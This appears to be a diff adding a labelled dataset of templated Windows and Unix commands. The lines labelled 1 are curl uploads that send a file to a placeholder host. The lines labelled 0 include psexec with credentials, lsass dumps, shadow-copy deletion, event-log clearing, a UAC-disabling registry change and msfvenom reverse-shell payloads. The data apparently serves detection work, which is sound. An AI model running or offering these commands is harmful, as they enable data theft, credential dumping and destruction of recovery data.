@@ -1,0 +1,128 @@
+1	curl -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'
+1	cmd /c "curl -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
+1	powershell -c "curl -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
+1	curl.exe -X POST http://${ip_address}/upload -H -F "files=@${source_file_path}"
+1	cmd /c "curl.exe -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
+1	powershell -c "curl.exe -X POST http://${ip_address}/upload -H -F 'files=@${source_file_path}'"
+1	curl -X POST -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
+1	cmd /c "curl -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+1	powershell -c "curl -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+1	curl -X POST http://${ip_address}/upload -F "files=@${source_file_path}"
+1	cmd /c "curl -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
+1	powershell -c "curl -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
+1	curl.exe -X POST http://${ip_address}/upload -F "files=@${source_file_path}"
+1	cmd /c "curl.exe -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
+1	powershell -c "curl.exe -X POST http://${ip_address}/upload -F 'files=@${source_file_path}'"
+1	curl -X POST -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
+1	cmd /c "curl -X POST -F "file=@${source_file_path}" http://${ip_address}:${port}/upload"
+1	powershell -c "curl -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+1	curl.exe -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload
+1	cmd /c "curl.exe -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+1	powershell -c "curl.exe -X POST -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+1	curl -X POST -H -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
+1	cmd /c "curl -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+1	powershell -c "curl -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+1	curl.exe -X POST -H -F "file=@${source_file_path}" http://${ip_address}:${port}/upload
+1	cmd /c "curl.exe -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+1	powershell -c "curl.exe -X POST -H -F 'file=@${source_file_path}' http://${ip_address}:${port}/upload"
+1	curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
+1	cmd /c "curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+1	powershell -c "curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+1	curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
+1	cmd /c "curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+1	powershell -c "curl.exe -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+1	curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
+1	cmd /c "curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+1	powershell -c "curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+1	curl -X POST http://${ip_address}/upload -F files=@${source_file_path}
+1	cmd /c "curl -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+1	powershell -c "curl -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+1	curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path}
+1	cmd /c "curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+1	powershell -c "curl.exe -X POST http://${ip_address}/upload -F files=@${source_file_path}"
+1	curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
+1	cmd /c "curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+1	powershell -c "curl -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+1	curl.exe -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
+1	cmd /c "curl.exe -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+1	powershell -c "curl.exe -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+1	curl -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload
+1	cmd /c "curl -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+1	powershell -c "curl -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+1	curl.exe -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload
+1	cmd /c "curl.exe -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+1	powershell -c "curl.exe -X POST -H -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+1	curl -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
+1	cmd /c "curl -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+1	powershell -c "curl -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+1	curl.exe -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}
+1	cmd /c "curl.exe -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+1	powershell -c "curl.exe -v -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+1	curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload
+1	cmd /c "curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+1	powershell -c "curl -v -X POST -F file=@${source_file_path} http://${ip_address}:${port}/upload"
+1	curl -v -X POST http://${ip_address}/upload -F files=@${source_file_path}
+0	powershell -c "wevtutil.exe cl system"
+0	echo ${email_content} | mpack -s ${email_subject} ${username}@${domain} 2> error.log
+0	psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -s ${command_to_execute} -d
+0	powershell -c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s"
+0	powershell -c "mstsc.exe /v:${ip_address} /remoteGuard"
+0	reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_QWORD_LITTLE_ENDIAN /d 0 /f
+0	cmd /c "sdelete.exe -f -accepteula ${local_file_path}"
+0	plink -ssh -P ${remote_port} -l ${username} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+0	cmd /c "vssadmin.exe delete shadows /all /Quiet"
+0	cmd /c "wevtutil.exe cl application"
+0	plink.exe -ssh -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+0	procdump.exe -accepteula -mm lsass lsassdump.dmp
+0	vssadmin.exe Delete Shadows /all /Quiet
+0	cmd /c "choco install -f winscp"
+0	echo ${email_content} | sendmail ${username}@${domain} 2> /dev/null
+0	7z.exe a -slp -p${password} ${destination_file_path} ${source_file_path}
+0	powershell -c "del /f /p ${local_file_path}"
+0	mstsc.exe /v:${ip_address} /remoteGuard
+0	cmd /c "msfvenom -p windows/meterpreter_reverse_http LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	sdelete ${local_file_path}
+0	cmd /c "wmic os get Caption,Version"
+0	powershell -c "7z.exe a -slp ${destination_file_path} ${source_file_path} -p"
+0	cmd /c "certutil -encode -Unicode -gmt -v -f error.txt encode.txt"
+0	powershell -c "wmic.exe os get FreePhysicalMemory"
+0	cmd /c "procdump -ma lsass.exe lsassdump.dmp"
+0	Psexec64 \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute}
+0	cmd /c "psexec \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d"
+0	psexec \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute} -d
+0	cmd /c "tasklist"
+0	nmap -T5 ${ip_address}
+0	powershell -c "sdelete -f ${local_file_path}"
+0	powershell -c "wevtutil.exe clear-log security"
+0	taskkill /F /im ${process_name} /T
+0	cmd /c "mstsc.exe /v:${ip_address} /f /admin"
+0	powershell -c "netstat.exe -a"
+0	cmd /c "choco install -f procdump"
+0	mstsc.exe /v:${ip_address} /f
+0	ipconfig.exe /all
+0	cmd /c "msfvenom -p windows/x64/meterpreter/reverse_tcp_rc4 LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	powershell -c "choco install procdump"
+0	powershell -c "vssadmin.exe delete shadows /all /quiet"
+0	certutil -encode -Unicode -v -f error.txt encode.txt
+0	powershell -c "netstat.exe -r"
+0	powershell -c "wmic.exe os get Caption"
+0	choco install -y Megasync
+0	echo ${email_content} | mail -s ${email_subject} ${username}@${domain} 2> error.log
+0	cat email.txt | ssmtp ${username}@${domain} 2> &1
+0	cmd /c "msfvenom -p windows/meterpreter/reverse_tcp_rc4_dns LHOST=${ip_address} LPORT=${port} -f exe -o reverse.exe"
+0	taskkill.exe /im ${process_name} /T
+0	sc stop ${service_name}
+0	powershell -c "7z a -slp ${destination_file_path} ${source_file_path} -p"
+0	arp -g
+0	Psexec64 \\${ip_address} -u ${username} -p ${password} -i ${command_to_execute} -d -s
+0	cmd /c "vssadmin Delete Shadows /All /quiet"
+0	cmd /c "psexec.exe \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -s"
+0	cat email.txt | sendmail ${username}@${domain}
+0	nmap -p- -sC ${ip_address} 2> &1
+0	nmap -v ${ip_address} 2> /dev/null
+0	cmd /c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /t REG_SZ
+0	powershell -c "reg add hkcu\software\classes\mscfile\shell\open\command /ve /d ${command_to_execute} /f"
+0	plink -ssh ${username}@${ip_address} -P ${remote_port} -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N
+0	powershell -c "psexec \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
+0	powershell -c "psexec \\${ip_address} -accepteula -u ${username} -p ${password} -i ${command_to_execute} -d -s"
+0	certutil -encode -Unicode -gmt -v -f error.txt encode.txt
